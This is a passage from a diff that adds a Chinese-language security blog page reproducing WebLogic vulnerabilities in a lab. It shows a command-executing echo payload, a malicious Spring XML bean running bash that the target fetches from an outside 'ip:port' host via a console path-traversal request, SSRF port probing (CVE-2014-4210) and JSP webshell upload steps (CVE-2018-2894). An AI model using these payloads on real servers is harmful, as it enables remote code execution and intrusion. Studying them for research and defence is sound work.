ervletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在 http 头添加 cmd 参数及其值即可 rce</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ed993c5.png" alt="image-20250505174455535" srcset="https://bu.dusays.com/2025/05/11/682043ed993c5.png?size=small, https://bu.dusays.com/2025/05/11/682043ed993c5.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ed993c5.png?size=large 2x" data-title="image-20250505174455535" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="方法二" class="heading-element"><span>方法二</span>
+  <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>利用的是 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p>
+<p>从这个函数都可以看出来，加载恶意xml来rce，此利用方法无版本限制，但是需要出网，公网上放1.xml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span> <span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">beans</span> <span class="n">xmlns</span><span class="o">=</span><span class="s2">&#34;http://www.springframework.org/schema/beans&#34;</span>
+</span></span><span class="line"><span class="cl">   <span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s2">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span class="line"><span class="cl">   <span class="n">xsi</span><span class="p">:</span><span class="n">schemaLocation</span><span class="o">=</span><span class="s2">&#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;pb&#34;</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;java.lang.ProcessBuilder&#34;</span> <span class="n">init</span><span class="o">-</span><span class="n">method</span><span class="o">=</span><span class="s2">&#34;start&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">constructor</span><span class="o">-</span><span class="n">arg</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="o">&lt;</span><span class="n">list</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span><span class="n">bash</span><span class="o">&lt;/</span><span class="n">value</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;-</span><span class="n">c</span><span class="o">&lt;/</span><span class="n">value</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;&lt;!</span><span class="p">[</span><span class="n">CDATA</span><span class="p">[</span><span class="n">touch</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">xml_test</span><span class="p">]]</span><span class="o">&gt;&lt;/</span><span class="n">value</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="o">&lt;/</span><span class="n">list</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="n">constructor</span><span class="o">-</span><span class="n">arg</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">bean</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">beans</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后让其加载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&#34;http://ip:port/1.xml&#34;)</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec363d2.png" alt="image-20250505175100638" srcset="https://bu.dusays.com/2025/05/11/682043ec363d2.png?size=small, https://bu.dusays.com/2025/05/11/682043ec363d2.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec363d2.png?size=large 2x" data-title="image-20250505175100638" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="cve-2014-4210-ssrf" class="heading-element"><span>CVE-2014-4210 SSRF</span>
+  <a href="#cve-2014-4210-ssrf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="影响版本-1" class="heading-element"><span>影响版本</span>
+  <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Oracle WebLogic Server 10.0.2, 10.3.6</p>
+<h3 id="漏洞复现" class="heading-element"><span>漏洞复现</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>WebLogic 的 <code>SearchPublicReqistries.jsp</code> 接口存在 SSRF 漏洞，如果服务端或内网存在 Redis 未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。</p>
+<p><code>SearchPublicReqistries.jsp</code> 在 <code>/wlserver/server/lib/uddiexplorer.war</code> 中</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820441427db3.png" alt="image-20250505183040716" srcset="https://bu.dusays.com/2025/05/11/6820441427db3.png?size=small, https://bu.dusays.com/2025/05/11/6820441427db3.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820441427db3.png?size=large 2x" data-title="image-20250505183040716" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><code>operator</code> 参数就是传进去的 url，然后 <code>search.getResponse()</code> 就会向这个 url 发送请求，而且这个服务没有任何鉴权，可以直接访问，用 payload 探测下 7001 端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回显为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">An error has occurred
+</span></span><span class="line"><span class="cl">weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found). Please ensure that your URL is correct, and the web service has deployed without error. </span></span></code></pre></td></tr></table>
+</div>
+</div><p>当探测 7000 端口时回显</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">An error has occurred
+</span></span><span class="line"><span class="cl">weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &#39;1&#39; addresses, but could not connect over HTTP to server: &#39;127.0.0.1&#39;, port: &#39;7000&#39; </span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到 7001 端口只是没找到服务而 7000 端口都不能建立 http 连接，可以通过这个来探测端口</p>
+<h2 id="cve-2018-2894-任意文件上传" class="heading-element"><span>CVE-2018-2894 任意文件上传</span>
+  <a href="#cve-2018-2894-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="影响版本-2" class="heading-element"><span>影响版本</span>
+  <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Weblogic 10.3.6，12.1.3，12.2.1.2，12.2.1.3</p>
+<h3 id="漏洞复现-1" class="heading-element"><span>漏洞复现</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>weblogic如果开启了web服务测试页（默认不开启），则分别会在/ws_utc/begin.do以及/ws_utc/config.do这两个页面存在任意上传getshell漏洞</p>
+<p>由于该设置默认不开启，所以此漏洞有一定的局限性</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec95ce2.png" alt="image-20250505225259738" srcset="https://bu.dusays.com/2025/05/11/682043ec95ce2.png?size=small, https://bu.dusays.com/2025/05/11/682043ec95ce2.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec95ce2.png?size=large 2x" data-title="image-20250505225259738" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>“高级” 中开启 “启用 Web 服务测试页”，但我这没有这个选项，赛博复现下，挺简单的反正</p>
+<p>访问漏洞页面http://your-ip:7001/ws_utc/config.do（需要手动设置一下环境设置Work Home Dir为，/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css）</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec57ca4.png" alt="image-20250505225442049" srcset="https://bu.dusays.com/2025/05/11/682043ec57ca4.png?size=small, https://bu.dusays.com/2025/05/11/682043ec57ca4.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec57ca4.png?size=large 2x" data-title="image-20250505225442049" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>点击安全 -&gt; 添加，名字和密码可以随意设置，传个 jsp 马</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec85164.png" alt="image-20250505225448449" srcset="https://bu.dusays.com/2025/05/11/682043ec85164.png?size=small, https://bu.dusays.com/2025/05/11/682043ec85164.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec85164.png?size=large 2x" data-title="image-20250505225448449" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>文件上传的路径为http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，其二利用浏览器自带的检查获取，如下所示：</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec86f0b.png" alt="image-20250505225504857" srcset="https://bu.dusays.com/2025/05/11/682043ec86f0b.png?size=small, https://bu.dusays.com/2025/05/11/682043ec86f0b.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec86f0b.png?size=large 2x" data-title="image-20250505225504857" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后 rce 即可</p>
+<h3 id="小结" class="heading-element"><span>小结</span>
+  <a href="#%e5%b0%8f%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>都挺简单的，感觉限制比较多，不是需要版本低就是要进后台或者开启某些特殊配置，nday是这样的，也算是对 weblogic 有个简单的了解</p>
+<h3 id="参考" class="heading-element"><span>参考</span>
+  <a href="#%e5%8f%82%e8%80%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/"target="_blank" rel="external nofollow noopener noreferrer">https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/</a></p>
+<p><a href="https://blog.csdn.net/weixin_51198941/article/details/134193310"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/weixin_51198941/article/details/134193310</a></p>
+<h2 id="cve-2021-2109-weblogic-jndi-注入" class="heading-element"><span>CVE-2021-2109 WebLogic JNDI 注入</span>
+  <a href="#cve-2021-2109-weblogic-jndi-%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>参考T3反序列化的环境，需要多加一个 <code>\server\lib\consoleapp\webapp\WEB-INF\lib\console.jar</code> 到依赖中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞分析" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="利用前提" class="heading-element"><span>利用前提</span>
+  <a href="#%e5%88%a9%e7%94%a8%e5%89%8d%e6%8f%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>Oracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
+<p>这里要进入到 /console/consolejndi.portal 路由里才能打</p>
+<h4 id="漏洞分析-1" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1" class="heading-mark">
